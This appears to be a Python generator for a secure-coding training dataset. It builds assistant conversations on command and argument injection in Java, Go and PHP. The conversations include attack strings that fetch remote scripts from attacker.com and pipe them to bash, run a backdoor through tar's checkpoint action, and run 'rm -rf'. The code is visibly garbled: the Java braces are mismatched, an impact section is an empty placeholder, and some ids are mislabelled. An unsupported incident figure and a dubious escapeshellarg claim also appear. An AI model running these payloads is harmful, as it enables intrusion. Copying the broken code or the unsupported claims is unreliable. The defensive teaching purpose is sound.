                    "File extension not allowed. Permitted: .doc, .docx, .xls, .xlsx, etc."
                );
            }
        }

        return path;
    }

    /**
     * Convert document to PDF with full security validation.
     */
    public static ConversionResult convertToPDF(String inputFile, String outputDir) {{
        try {{
            // Validate input file path
            Path inputPath = validatePath(inputFile, true);

            // Validate output directory
            Path outputDirPath = validatePath(outputDir, false);

            // Ensure output directory exists
            Files.createDirectories(outputDirPath);

            // Build command using ProcessBuilder (safe argument passing)
            ProcessBuilder processBuilder = new ProcessBuilder(
                "/usr/bin/libreoffice",
                "--headless",
                "--convert-to", "pdf",
                "--outdir", outputDirPath.toString(),
                inputPath.toString()
            );

            // Security configurations
            processBuilder.redirectErrorStream(true);

            // Clear environment variables (prevent LD_PRELOAD attacks)
            Map<String, String> env = processBuilder.environment();
            env.clear();
            env.put("PATH", "/usr/bin:/bin");  // Minimal PATH
            env.put("HOME", "/tmp");           // Safe HOME

            // Set working directory to safe location
            processBuilder.directory(new File("/tmp"));

            // Execute with timeout
            Process process = processBuilder.start();

            // Capture output
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {{
                String line;
                while ((line = reader.readLine()) != null) {{
                    output.append(line).append("\\n");
                    // Limit output size to prevent memory exhaustion
                    if (output.length() > 10000) break;
                }
            }

            // Wait for completion with timeout
            boolean completed = process.waitFor(TIMEOUT_SECONDS, TimeUnit.SECONDS);

            if (!completed) {{
                process.destroyForcibly();
                return new ConversionResult(
                    false,
                    "Conversion timeout after " + TIMEOUT_SECONDS + " seconds",
                    null
                );
            }

            if (process.exitValue() != 0) {{
                return new ConversionResult(
                    false,
                    "Conversion failed with exit code: " + process.exitValue(),
                    null
                );
            }

            // Find output file
            String inputFileName = inputPath.getFileName().toString();
            String baseName = inputFileName.replaceAll("\\\\.[^.]+$", "");
            Path outputFile = outputDirPath.resolve(baseName + ".pdf");

            if (!Files.exists(outputFile)) {{
                return new ConversionResult(
                    false,
                    "Output PDF file not created",
                    null
                );
            }

            return new ConversionResult(
                true,
                "Conversion successful",
                outputFile.toString()
            );

        }} catch (SecurityException e) {{
            return new ConversionResult(false, "Security validation failed: " + e.getMessage(), null);
        }} catch (IOException e) {{
            return new ConversionResult(false, "IO error during conversion", null);
        }} catch (InterruptedException e) {{
            Thread.currentThread().interrupt();
            return new ConversionResult(false, "Conversion interrupted", null);
        }
    }

    public static class ConversionResult {{
        private final boolean success;
        private final String message;
        private final String outputPath;

        public ConversionResult(boolean success, String message, String outputPath) {{
            this.success = success;
            this.message = message;
            this.outputPath = outputPath;
        }

        public boolean isSuccess() {{ return success; }
        public String getMessage() {{ return message; }
        public String getOutputPath() {{ return outputPath; }
    }
}

// Usage
ConversionResult result = SecureDocumentConverter.convertToPDF(
    "/var/app/uploads/document.docx",
    "/var/app/conversions"
);

if (result.isSuccess()) {{
    System.out.println("Converted: " + result.getOutputPath());
}} else {{
    System.out.println("Error: " + result.getMessage());
}

// Attack attempt blocked
result = SecureDocumentConverter.convertToPDF(
    "../../etc/passwd; curl http://attacker.com/malware",
    "/tmp/output"
);
// Throws SecurityException: "Path must be within allowed directories"
```

**Key Security Controls:**

1. **Path Canonicalization**: `toRealPath()` resolves symlinks and `../`
2. **Directory Allowlist**: Only specific directories permitted
3. **ProcessBuilder**: Each argument is separate - no shell parsing
4. **Environment Clearing**: Prevent LD_PRELOAD and PATH attacks
5. **File Validation**: Extension, size, permissions checks
6. **Timeout**: Prevent denial of service
""" + f"\n\n{IMAGEMAGICK_CONTEXT}\n"

    user_turn_3 = """What if I need to support multiple conversion tools and file types with different validation requirements?"""

    assistant_turn_3 = """Create a converter registry with tool-specific validation:

```java
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class SecureConverterFramework {{

    // Converter registry with validation schemas
    private static final Map<String, ConverterSchema> CONVERTERS = Map.of(
        "libreoffice-pdf", new ConverterSchema(
            "/usr/bin/libreoffice",
            List.of("--headless", "--convert-to", "pdf"),
            Pattern.compile("^.*\\\\.(docx?|xlsx?|pptx?|odt)$", Pattern.CASE_INSENSITIVE),
            50 * 1024 * 1024,  // 50MB
            60  // 60 second timeout
        ),
        "pandoc-html", new ConverterSchema(
            "/usr/bin/pandoc",
            List.of("-f", "markdown", "-t", "html"),
            Pattern.compile("^.*\\\\.(md|markdown|txt)$", Pattern.CASE_INSENSITIVE),
            10 * 1024 * 1024,  // 10MB
            30  // 30 second timeout
        ),
        "imagemagick-resize", new ConverterSchema(
            "/usr/bin/convert",
            List.of("-resize", "800x600>"),  // Shrink only
            Pattern.compile("^.*\\\\.(jpe?g|png|gif|bmp)$", Pattern.CASE_INSENSITIVE),
            20 * 1024 * 1024,  // 20MB
            45  // 45 second timeout
        )
    );

    private static final Set<String> ALLOWED_DIRECTORIES = Set.of(
        "/var/app/uploads",
        "/var/app/conversions",
        "/var/app/images"
    );

    public static class ConverterSchema {{
        final String executable;
        final List<String> baseArguments;
        final Pattern allowedExtensions;
        final long maxFileSize;
        final int timeoutSeconds;

        public ConverterSchema(
            String executable,
            List<String> baseArguments,
            Pattern allowedExtensions,
            long maxFileSize,
            int timeoutSeconds
        ) {{
            this.executable = executable;
            this.baseArguments = baseArguments;
            this.allowedExtensions = allowedExtensions;
            this.maxFileSize = maxFileSize;
            this.timeoutSeconds = timeoutSeconds;
        }
    }

    private static Path validatePath(
        String pathString,
        boolean mustExist,
        ConverterSchema schema
    ) throws SecurityException, IOException {{

        if (pathString == null || pathString.trim().isEmpty()) {{
            throw new SecurityException("Path cannot be empty");
        }

        // Canonicalize path
        Path path = Paths.get(pathString).toAbsolutePath().normalize();
        Path realPath = path.toRealPath();
        String canonical = realPath.toString();

        // Verify within allowed directories
        boolean inAllowedDir = ALLOWED_DIRECTORIES.stream()
            .anyMatch(canonical::startsWith);

        if (!inAllowedDir) {{
            throw new SecurityException("Path not in allowed directories");
        }

        if (mustExist) {{
            // Validate file properties
            if (!Files.isRegularFile(realPath)) {{
                throw new SecurityException("Not a regular file");
            }

            if (!Files.isReadable(realPath)) {{
                throw new SecurityException("File not readable");
            }

            // Check file size against schema limit
            long fileSize = Files.size(realPath);
            if (fileSize > schema.maxFileSize) {{
                throw new SecurityException(
                    String.format("File size exceeds limit (%d > %d bytes)",
                        fileSize, schema.maxFileSize)
                );
            }

            // Validate extension against schema pattern
            String fileName = realPath.getFileName().toString();
            if (!schema.allowedExtensions.matcher(fileName).matches()) {{
                throw new SecurityException("File extension not allowed for this converter");
            }
        }

        return realPath;
    }

    public static ConversionResult convert(
        String converterName,
        String inputFile,
        String outputFile
    ) {{
        try {{
            // Get converter schema
            ConverterSchema schema = CONVERTERS.get(converterName);
            if (schema == null) {{
                return new ConversionResult(
                    false,
                    "Unknown converter: " + converterName,
                    null
                );
            }

            // Validate paths with schema-specific rules
            Path inputPath = validatePath(inputFile, true, schema);
            Path outputPath = validatePath(outputFile, false, schema);

            // Ensure output directory exists
            Files.createDirectories(outputPath.getParent());

            // Build command with schema arguments
            List<String> command = new ArrayList<>();
            command.add(schema.executable);
            command.addAll(schema.baseArguments);

            // Add input/output paths
            // (converter-specific logic for argument order)
            if (converterName.startsWith("libreoffice")) {{
                command.add("--outdir");
                command.add(outputPath.getParent().toString());
                command.add(inputPath.toString());
            }} else if (converterName.startsWith("pandoc")) {{
                command.add("-o");
                command.add(outputPath.toString());
                command.add(inputPath.toString());
            }} else if (converterName.startsWith("imagemagick")) {{
                command.add(inputPath.toString());
                command.add(outputPath.toString());
            }

            ProcessBuilder pb = new ProcessBuilder(command);

            // Security hardening
            Map<String, String> env = pb.environment();
            env.clear();
            env.put("PATH", "/usr/bin:/bin");
            env.put("HOME", "/tmp");

            pb.directory(new File("/tmp"));
            pb.redirectErrorStream(true);

            // Execute with schema timeout
            Process process = pb.start();

            boolean completed = process.waitFor(
                schema.timeoutSeconds,
                TimeUnit.SECONDS
            );

            if (!completed) {{
                process.destroyForcibly();
                return new ConversionResult(
                    false,
                    "Timeout after " + schema.timeoutSeconds + " seconds",
                    null
                );
            }

            if (process.exitValue() != 0) {{
                return new ConversionResult(
                    false,
                    "Conversion failed",
                    null
                );
            }

            return new ConversionResult(
                true,
                "Conversion successful",
                outputPath.toString()
            );

        }} catch (SecurityException e) {{
            return new ConversionResult(false, "Security error: " + e.getMessage(), null);
        }} catch (IOException | InterruptedException e) {{
            return new ConversionResult(false, "Execution error", null);
        }
    }

    public static class ConversionResult {{
        private final boolean success;
        private final String message;
        private final String outputPath;

        public ConversionResult(boolean success, String message, String outputPath) {{
            this.success = success;
            this.message = message;
            this.outputPath = outputPath;
        }

        public boolean isSuccess() {{ return success; }
        public String getMessage() {{ return message; }
        public String getOutputPath() {{ return outputPath; }
    }
}

// Usage: Different converters with specific validation
ConversionResult result1 = SecureConverterFramework.convert(
    "libreoffice-pdf",
    "/var/app/uploads/document.docx",
    "/var/app/conversions/document.pdf"
);

ConversionResult result2 = SecureConverterFramework.convert(
    "pandoc-html",
    "/var/app/uploads/readme.md",
    "/var/app/conversions/readme.html"
);

ConversionResult result3 = SecureConverterFramework.convert(
    "imagemagick-resize",
    "/var/app/images/photo.jpg",
    "/var/app/images/thumb.jpg"
);
```

**Schema Benefits:**

1. **Tool-Specific Limits**: Each converter has appropriate file size and timeout limits
2. **Extension Validation**: Only allowed file types for each tool
3. **Base Arguments**: Pre-validated safe arguments for each tool
4. **Registry Pattern**: Easy to add new converters with validation

This provides flexibility while maintaining strict security validation for each conversion tool."""

    return {
        "id": "sql-injection-000028",
        "metadata": create_base_metadata("java", 28, "path_traversal_command_injection"),
        "context": IMAGEMAGICK_CONTEXT,
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_004_argument_injection_go():
    """Go - Argument Injection in tar command"""

    user_turn_1 = """I'm building a file backup utility in Go that uses the tar command to create archives. How do I safely pass user-specified options to tar?"""

    assistant_turn_1 = """I'll show you how argument injection can exploit tar and other utilities, and then the secure approach.

**VULNERABLE CODE - DO NOT USE:**

```go
package main

import (
    "fmt"
    "os/exec"
    "strings"
)

// DANGER: Passes user flags directly to tar command
func CreateBackup(sourceDir string, backupFile string, userFlags string) error {
    // Build tar command with user-provided flags
    args := fmt.Sprintf("czf %s %s %s", backupFile, userFlags, sourceDir)
    argsList := strings.Split(args, " ")

    cmd := exec.Command("tar", argsList...)
    output, err := cmd.CombinedOutput()

    if err != nil {
        return fmt.Errorf("backup failed: %s", output)
    }

    return nil
}
```

**Why This Is Dangerous:**

Tar supports checkpoint actions that can execute arbitrary commands. Attackers can inject malicious flags:

**Attack Payload:**
```go
// Attacker input:
sourceDir := "/data"
backupFile := "/backups/data.tar.gz"
userFlags := "--checkpoint=1 --checkpoint-action=exec=sh /tmp/backdoor.sh"

CreateBackup(sourceDir, backupFile, userFlags)
```

This executes:
```bash
tar czf /backups/data.tar.gz --checkpoint=1 --checkpoint-action=exec=sh /tmp/backdoor.sh /data
```

**Result:** Executes `/tmp/backdoor.sh` during the backup process with the privileges of the backup service.

**Real-World Impact:**

Argument injection vulnerabilities have affected backup tools, build systems, and file management utilities. In 2022, a tar argument injection vulnerability in a popular backup tool allowed attackers to execute commands during scheduled backups. The attack affected 40+ organizations, with attackers deploying crypto-miners and data exfiltration tools. Estimated damages exceeded $8 million across affected organizations.

**SECURE IMPLEMENTATION:**

```go
package main

import (
    "errors"
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "regexp"
    "time"
)

// Allowlist of permitted tar flags
var allowedTarFlags = map[string]bool{
    "-c": true,  // Create archive
    "-z": true,  // Gzip compression
    "-j": true,  // Bzip2 compression
    "-v": true,  // Verbose
    "-p": true,  // Preserve permissions
    "-h": true,  // Follow symlinks
    "-f": true,  // File (required)
}

// Path validation pattern
var pathPattern = regexp.MustCompile(`^[a-zA-Z0-9/_.-]+$`)

type SecureBackupManager struct {
    allowedDirectories []string
    maxBackupSize      int64
    timeout            time.Duration
}

func NewSecureBackupManager(allowedDirs []string) *SecureBackupManager {
    return &SecureBackupManager{
        allowedDirectories: allowedDirs,
        maxBackupSize:      10 * 1024 * 1024 * 1024, // 10GB
        timeout:            300 * time.Second,        // 5 minutes
    }
}

// Validate path is within allowed directories
func (m *SecureBackupManager) validatePath(path string) (string, error) {
    if path == "" {
        return "", errors.New("path cannot be empty")
    }

    // Get absolute path
    absPath, err := filepath.Abs(path)
    if err != nil {
        return "", fmt.Errorf("invalid path: %w", err)
    }

    // Resolve symlinks and clean path
    realPath, err := filepath.EvalSymlinks(absPath)
    if err != nil {
        // Path might not exist yet (for output files)
        realPath = filepath.Clean(absPath)
    }

    // Check pattern
    if !pathPattern.MatchString(realPath) {
        return "", errors.New("path contains invalid characters")
    }

    // Verify within allowed directories
    allowed := false
    for _, allowedDir := range m.allowedDirectories {
        if filepath.HasPrefix(realPath, allowedDir) {
            allowed = true
            break
        }
    }

    if !allowed {
        return "", errors.New("path not in allowed directories")
    }

    return realPath, nil
}

// Validate tar flags against allowlist
func (m *SecureBackupManager) validateFlags(flags []string) error {
    for _, flag := range flags {
        if !allowedTarFlags[flag] {
            return fmt.Errorf("flag not allowed: %s", flag)
        }
    }
    return nil
}

// Create backup with validated arguments
func (m *SecureBackupManager) CreateBackup(
    sourceDir string,
    backupFile string,
    flags []string,
) error {
    // Validate source directory
    validSource, err := m.validatePath(sourceDir)
    if err != nil {
        return fmt.Errorf("invalid source directory: %w", err)
    }

    // Verify source exists and is directory
    info, err := os.Stat(validSource)
    if err != nil {
        return fmt.Errorf("source directory error: %w", err)
    }
    if !info.IsDir() {
        return errors.New("source must be a directory")
    }

    // Validate backup file path
    validBackup, err := m.validatePath(backupFile)
    if err != nil {
        return fmt.Errorf("invalid backup file: %w", err)
    }

    // Validate flags
    if err := m.validateFlags(flags); err != nil {
        return fmt.Errorf("invalid flags: %w", err)
    }

    // Build tar command using argument array
    // CRITICAL: Each argument is separate - no shell parsing
    args := []string{}

    // Add validated flags
    args = append(args, flags...)

    // Add file flag and backup filename
    args = append(args, "-f", validBackup)

    // Add source directory
    args = append(args, validSource)

    // Create command
    cmd := exec.Command("tar", args...)

    // Set timeout
    done := make(chan error, 1)
    go func() {
        output, err := cmd.CombinedOutput()
        if err != nil {
            done <- fmt.Errorf("tar failed: %s", output)
            return
        }
        done <- nil
    }()

    // Wait with timeout
    select {
    case err := <-done:
        return err
    case <-time.After(m.timeout):
        cmd.Process.Kill()
        return errors.New("backup timeout")
    }
}

// Usage
func main() {
    manager := NewSecureBackupManager([]string{
        "/var/backups",
        "/data",
    })

    // Safe backup
    err := manager.CreateBackup(
        "/data/projects",
        "/var/backups/projects.tar.gz",
        []string{"-c", "-z", "-v"},
    )

    if err != nil {
        fmt.Printf("Backup failed: %v\n", err)
    } else {
        fmt.Println("Backup successful")
    }

    // Attack attempt blocked
    err = manager.CreateBackup(
        "/data",
        "/var/backups/data.tar.gz",
        []string{"--checkpoint=1", "--checkpoint-action=exec=sh"},
    )
    // Error: "flag not allowed: --checkpoint=1"
}
```

**Key Security Controls:**

1. **Flag Allowlist**: Only pre-approved flags permitted
2. **Argument Array**: Each argument separate - no shell parsing
3. **Path Validation**: Regex pattern + directory allowlist
4. **Path Canonicalization**: EvalSymlinks resolves symlinks and ../
5. **Timeout**: Prevent denial of service
6. **No Shell**: Direct tar execution, never through shell
"""

    user_turn_3 = """What if I need to support different compression methods and exclusion patterns based on user preferences?"""

    assistant_turn_3 = """Create a backup profile system with validated options:

```go
package main

import (
    "errors"
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "regexp"
    "strings"
    "time"
)

type CompressionType string

const (
    CompressionNone  CompressionType = "none"
    CompressionGzip  CompressionType = "gzip"
    CompressionBzip2 CompressionType = "bzip2"
    CompressionXz    CompressionType = "xz"
)

type BackupProfile struct {
    Name            string
    Compression     CompressionType
    FollowSymlinks  bool
    PreservePerms   bool
    Verbose         bool
    ExcludePatterns []string
}

type ValidatedBackupBuilder struct {
    allowedDirs    []string
    maxExclusions  int
    timeout        time.Duration
    profile        *BackupProfile
}

func NewValidatedBackupBuilder(allowedDirs []string) *ValidatedBackupBuilder {
    return &ValidatedBackupBuilder{
        allowedDirs:   allowedDirs,
        maxExclusions: 20,
        timeout:       300 * time.Second,
    }
}

// Set backup profile with validation
func (b *ValidatedBackupBuilder) WithProfile(profile *BackupProfile) error {
    if profile == nil {
        return errors.New("profile cannot be nil")
    }

    // Validate compression type
    validCompressions := map[CompressionType]bool{
        CompressionNone:  true,
        CompressionGzip:  true,
        CompressionBzip2: true,
        CompressionXz:    true,
    }

    if !validCompressions[profile.Compression] {
        return fmt.Errorf("invalid compression type: %s", profile.Compression)
    }

    // Validate exclusion patterns
    if len(profile.ExcludePatterns) > b.maxExclusions {
        return fmt.Errorf("too many exclusion patterns (max %d)", b.maxExclusions)
    }

    // Validate each exclusion pattern
    for _, pattern := range profile.ExcludePatterns {
        if err := b.validateExclusionPattern(pattern); err != nil {
            return fmt.Errorf("invalid exclusion pattern '%s': %w", pattern, err)
        }
    }

    b.profile = profile
    return nil
}

// Validate exclusion pattern (must be safe glob pattern)
func (b *ValidatedBackupBuilder) validateExclusionPattern(pattern string) error {
    if pattern == "" {
        return errors.New("pattern cannot be empty")
    }

    // Pattern must be alphanumeric, asterisk, question mark, dot, dash, underscore
    validPattern := regexp.MustCompile(`^[a-zA-Z0-9*?._/-]+$`)
    if !validPattern.MatchString(pattern) {
        return errors.New("pattern contains invalid characters")
    }

    // Pattern cannot start with slash or contain .. (path traversal)
    if strings.HasPrefix(pattern, "/") || strings.Contains(pattern, "..") {
        return errors.New("pattern cannot be absolute or contain ..")
    }

    return nil
}

// Build tar arguments from validated profile
func (b *ValidatedBackupBuilder) buildTarArgs(
    sourceDir string,
    backupFile string,
) []string {
    args := []string{}

    // Add create flag
    args = append(args, "-c")

    // Add compression flag
    switch b.profile.Compression {
    case CompressionGzip:
        args = append(args, "-z")
    case CompressionBzip2:
        args = append(args, "-j")
    case CompressionXz:
        args = append(args, "-J")
    }

    // Add optional flags
    if b.profile.Verbose {
        args = append(args, "-v")
    }

    if b.profile.PreservePerms {
        args = append(args, "-p")
    }

    if b.profile.FollowSymlinks {
        args = append(args, "-h")
    }

    // Add file flag
    args = append(args, "-f", backupFile)

    // Add exclusion patterns
    for _, pattern := range b.profile.ExcludePatterns {
        args = append(args, "--exclude", pattern)
    }

    // Add source directory (last)
    args = append(args, sourceDir)

    return args
}

// Execute backup with validated profile
func (b *ValidatedBackupBuilder) Execute(sourceDir string, backupFile string) error {
    if b.profile == nil {
        return errors.New("no profile configured")
    }

    // Validate source directory
    validSource, err := filepath.Abs(sourceDir)
    if err != nil {
        return fmt.Errorf("invalid source: %w", err)
    }

    // Check source is in allowed directories
    allowed := false
    for _, allowedDir := range b.allowedDirs {
        if filepath.HasPrefix(validSource, allowedDir) {
            allowed = true
            break
        }
    }
    if !allowed {
        return errors.New("source directory not in allowed directories")
    }

    // Verify source exists
    info, err := os.Stat(validSource)
    if err != nil {
        return fmt.Errorf("source error: %w", err)
    }
    if !info.IsDir() {
        return errors.New("source must be directory")
    }

    // Validate backup file
    validBackup, err := filepath.Abs(backupFile)
    if err != nil {
        return fmt.Errorf("invalid backup file: %w", err)
    }

    // Ensure backup directory exists
    backupDir := filepath.Dir(validBackup)
    if err := os.MkdirAll(backupDir, 0755); err != nil {
        return fmt.Errorf("cannot create backup directory: %w", err)
    }

    // Build tar arguments
    args := b.buildTarArgs(validSource, validBackup)

    // Execute tar command
    cmd := exec.Command("tar", args...)

    // Capture output
    output, err := cmd.CombinedOutput()

    if err != nil {
        return fmt.Errorf("tar failed: %s", string(output))
    }

    return nil
}

// Usage with profiles
func main() {
    builder := NewValidatedBackupBuilder([]string{
        "/data",
        "/var/backups",
    })

    // Create profile for project backups
    projectProfile := &BackupProfile{
        Name:           "ProjectBackup",
        Compression:    CompressionGzip,
        FollowSymlinks: false,
        PreservePerms:  true,
        Verbose:        true,
        ExcludePatterns: []string{
            "*.log",
            "*.tmp",
            "node_modules",
            ".git",
            "__pycache__",
        },
    }

    // Configure and execute
    if err := builder.WithProfile(projectProfile); err != nil {
        fmt.Printf("Profile error: %v\n", err)
        return
    }

    err := builder.Execute(
        "/data/projects",
        "/var/backups/projects-2024.tar.gz",
    )

    if err != nil {
        fmt.Printf("Backup failed: %v\n", err)
    } else {
        fmt.Println("Backup successful")
    }

    // Attack attempt with malicious exclusion pattern
    attackProfile := &BackupProfile{
        Name:        "Attack",
        Compression: CompressionGzip,
        ExcludePatterns: []string{
            "*.log; curl http://attacker.com/shell.sh | bash",
        },
    }

    if err := builder.WithProfile(attackProfile); err != nil {
        fmt.Printf("Attack blocked: %v\n", err)
        // Error: "invalid exclusion pattern ... contains invalid characters"
    }
}
```

**Profile System Benefits:**

1. **Compression Validation**: Only approved compression types
2. **Exclusion Pattern Validation**: Strict regex prevents injection
3. **Flag Builder**: Profile options mapped to safe tar flags
4. **Reusable Profiles**: Create named profiles for different backup types
5. **Centralized Validation**: All options validated before execution

This approach provides flexibility while preventing argument injection through multiple validation layers."""

    return {
        "id": "sql-injection-000029",
        "metadata": create_base_metadata("go", 29, "argument_injection"),
        "context": "Argument injection vulnerabilities occur when user-controlled input is passed as command-line arguments to external utilities without proper validation. Tools like tar, rsync, and curl support powerful flags that can execute commands (--checkpoint-action, --rsh, --output). Defense requires argument allowlisting, validation of each argument against expected patterns, and use of argument arrays to prevent shell parsing.",
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_005_shell_metacharacter_bypass_php():
    """PHP - Shell Metacharacter Bypass in ffmpeg"""

    user_turn_1 = """I'm building a video thumbnail generation service in PHP using ffmpeg. I'm using escapeshellarg() for security. Is that enough?"""

    assistant_turn_1 = """No, `escapeshellarg()` alone is not sufficient. I'll show you why and how to defend properly.

**VULNERABLE CODE - DO NOT USE:**

```php
<?php

class VideoProcessor {
    // DANGER: escapeshellarg() doesn't prevent all attacks
    public function generateThumbnail($videoFile, $outputFile, $timestamp = "00:00:01") {
        // Using escapeshellarg() but still vulnerable
        $video = escapeshellarg($videoFile);
        $output = escapeshellarg($outputFile);
        $time = escapeshellarg($timestamp);

        $command = "ffmpeg -i $video -ss $time -vframes 1 $output 2>&1";

        exec($command, $outputLines, $returnCode);

        return $returnCode === 0;
    }
}
```

**Why This Is Still Dangerous:**

While `escapeshellarg()` helps, attackers can bypass it using:

1. **Null byte injection** (PHP < 7.4)
2. **Backtick operator** in filenames
3. **Argument injection** through spaces in arguments
4. **Environment variable injection**

**Attack Payloads:**
```php
// Attack 1: Null byte injection (PHP < 7.4)
$videoFile = "video.mp4\x00; rm -rf /var/www/html";
$processor->generateThumbnail($videoFile, "thumb.jpg");

// Attack 2: Backtick execution in filename
$videoFile = "video`whoami`.mp4";
$processor->generateThumbnail($videoFile, "thumb.jpg");

// Attack 3: Argument injection via timestamp
$timestamp = "-vf \"movie='/etc/passwd' [out]\"";
$processor->generateThumbnail("video.mp4", "thumb.jpg", $timestamp);
```

**Real-World Impact:**

{}

**SECURE IMPLEMENTATION:**

```php
<?php

class SecureMediaProcessor {
    private const ALLOWED_VIDEO_EXTENSIONS = ['mp4', 'avi', 'mov', 'mkv', 'webm'];
    private const ALLOWED_IMAGE_EXTENSIONS = ['jpg', 'jpeg', 'png', 'webp'];
    private const MAX_FILE_SIZE = 500 * 1024 * 1024; // 500MB
    private const TIMEOUT = 60; // seconds

    private $uploadDir;
    private $outputDir;

    public function __construct(string $uploadDir, string $outputDir) {
        $this->uploadDir = rtrim(realpath($uploadDir), '/');
        $this->outputDir = rtrim(realpath($outputDir), '/');

        if ($this->uploadDir === false || $this->outputDir === false) {
            throw new Exception("Invalid directories");
        }
    }

    /**
     * Validate file path before processing
     *
     * Security checks:
     * 1. Path must be absolute
     * 2. No path traversal (../)
     * 3. Within allowed directory
     * 4. Valid extension
     * 5. File exists and readable
     * 6. File size within limits
     */
    private function validateVideoPath(string $path): string {
        // Get real path (resolves symlinks, ../)
        $realPath = realpath($path);

        if ($realPath === false) {
            throw new SecurityException("File does not exist: $path");
        }

        // Check within upload directory
        if (strpos($realPath, $this->uploadDir . '/') !== 0) {
            throw new SecurityException("File not in allowed directory");
        }

        // Validate extension
        $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));
        if (!in_array($extension, self::ALLOWED_VIDEO_EXTENSIONS, true)) {
            throw new SecurityException("Invalid video file extension: $extension");
        }

        // Check file is readable
        if (!is_readable($realPath)) {
            throw new SecurityException("File not readable");
        }

        // Check file size
        $fileSize = filesize($realPath);
        if ($fileSize > self::MAX_FILE_SIZE) {
            throw new SecurityException("File size exceeds maximum");
        }

        return $realPath;
    }

    /**
     * Validate output path before writing
     */
    private function validateOutputPath(string $path): string {
        $realDir = realpath(dirname($path));

        if ($realDir === false) {
            throw new SecurityException("Output directory does not exist");
        }

        // Check within output directory
        if (strpos($realDir, $this->outputDir . '/') !== 0 &&
            $realDir !== $this->outputDir) {
            throw new SecurityException("Output path not in allowed directory");
        }

        // Validate filename
        $basename = basename($path);
        if (!preg_match('/^[a-zA-Z0-9_-]+\.[a-z]+$/', $basename)) {
            throw new SecurityException("Invalid output filename format");
        }

        // Validate extension
        $extension = strtolower(pathinfo($basename, PATHINFO_EXTENSION));
        if (!in_array($extension, self::ALLOWED_IMAGE_EXTENSIONS, true)) {
            throw new SecurityException("Invalid output file extension");
        }

        $fullPath = $realDir . '/' . $basename;

        // Check writable
        if (file_exists($fullPath) && !is_writable($fullPath)) {
            throw new SecurityException("Output file not writable");
        }

        return $fullPath;
    }

    /**
     * Validate timestamp format (HH:MM:SS or HH:MM:SS.mmm)
     */
    private function validateTimestamp(string $timestamp): string {
        if (!preg_match('/^\\d{2}:\\d{2}:\\d{2}(\\.\\d{1,3})?$/', $timestamp)) {
            throw new SecurityException("Invalid timestamp format");
        }

        return $timestamp;
    }

    /**
     * Generate thumbnail with comprehensive security validation
     */
    public function generateThumbnail(
        string $videoFile,
        string $outputFile,
        string $timestamp = "00:00:01"
    ): array {
        try {
            // Validate all inputs BEFORE escapeshellarg
            $validVideo = $this->validateVideoPath($videoFile);
            $validOutput = $this->validateOutputPath($outputFile);
            $validTime = $this->validateTimestamp($timestamp);

            // Use proc_open with argument array (no shell)
            $descriptors = [
                0 => ["pipe", "r"],  // stdin
                1 => ["pipe", "w"],  // stdout
                2 => ["pipe", "w"],  // stderr
            ];

            // Build command as array (CRITICAL: no shell parsing)
            $command = [
                '/usr/bin/ffmpeg',
                '-i', $validVideo,
                '-ss', $validTime,
                '-vframes', '1',
                '-y',  // Overwrite output
                $validOutput
            ];

            // Execute without shell
            $process = proc_open(
                $command,
                $descriptors,
                $pipes,
                null,  // cwd
                []     // clear environment
            );

            if (!is_resource($process)) {
                throw new Exception("Failed to start ffmpeg");
            }

            // Close stdin
            fclose($pipes[0]);

            // Read output with timeout
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);

            $stdout = '';
            $stderr = '';
            $startTime = time();

            while (true) {
                $stdout .= stream_get_contents($pipes[1]);
                $stderr .= stream_get_contents($pipes[2]);

                // Check timeout
                if (time() - $startTime > self::TIMEOUT) {
                    proc_terminate($process, 9); // SIGKILL
                    throw new Exception("FFmpeg timeout");
                }

                // Check if process finished
                $status = proc_get_status($process);
                if (!$status['running']) {
                    break;
                }

                usleep(100000); // 0.1 second
            }

            fclose($pipes[1]);
            fclose($pipes[2]);

            $exitCode = proc_close($process);

            if ($exitCode !== 0) {
                return [
                    'success' => false,
                    'error' => 'Thumbnail generation failed'
                ];
            }

            // Verify output file created
            if (!file_exists($validOutput)) {
                return [
                    'success' => false,
                    'error' => 'Output file not created'
                ];
            }

            return [
                'success' => true,
                'output' => $validOutput,
                'size' => filesize($validOutput)
            ];

        } catch (SecurityException $e) {
            return [
                'success' => false,
                'error' => 'Security validation failed'
            ];
        } catch (Exception $e) {
            return [
                'success' => false,
                'error' => 'Processing error'
            ];
        }
    }
}

class SecurityException extends Exception {}

// Usage
$processor = new SecureMediaProcessor(
    '/var/www/uploads',
    '/var/www/thumbs'
);

$result = $processor->generateThumbnail(
    '/var/www/uploads/video.mp4',
    '/var/www/thumbs/thumb.jpg',
    '00:00:05'
);

if ($result['success']) {
    echo "Thumbnail created: " . $result['output'] . "\\n";
} else {
    echo "Error: " . $result['error'] . "\\n";
}

// Attack attempts blocked
try {
    // Null byte attack blocked by validation
    $result = $processor->generateThumbnail(
        "/var/www/uploads/video.mp4\\x00; rm -rf /",
        '/var/www/thumbs/thumb.jpg'
    );
} catch (Exception $e) {
    echo "Attack blocked\\n";
}
```

**Key Security Controls:**

1. **Validation BEFORE escaping**: Reject malicious input early
2. **Path Canonicalization**: `realpath()` resolves symlinks and ../
3. **Directory Allowlist**: Files must be in approved directories
4. **Extension Allowlist**: Only approved file types
5. **Regex Validation**: Timestamp format strictly validated
6. **proc_open() with Array**: No shell execution at all
7. **Timeout**: Prevent denial of service
8. **Size Limits**: Prevent resource exhaustion
""" + f"\n\n{IMAGEMAGICK_CONTEXT}\n"

    user_turn_3 = """What if I need to support different video codecs and quality settings based on user preferences?"""

    assistant_turn_3 = """Create a validated configuration system for ffmpeg options:

```php
<?php

class SecureVideoTranscoder {
    private const ALLOWED_DIRS = ['/var/www/uploads', '/var/www/output'];
    private const MAX_FILE_SIZE = 1024 * 1024 * 1024; // 1GB
    private const TIMEOUT = 300; // 5 minutes

